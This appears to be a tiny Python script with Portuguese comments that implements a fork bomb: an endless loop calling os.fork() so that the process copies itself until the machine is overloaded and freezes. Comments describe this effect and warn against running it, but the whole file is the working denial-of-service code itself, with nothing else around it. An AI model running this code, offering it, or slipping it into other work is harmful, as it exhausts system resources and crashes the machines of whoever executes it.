# coding: utf-8 *-

# Este script quando executado, faz copia de si mesmo indefinidamente
# fazendo com que a maquina fique sobrecarregada, travando e etc...

# OBS: Não execute o script de qualquer forma

import os # Importa OS

while True: # Laço infinito
    os.fork() # Auto replicagem infinita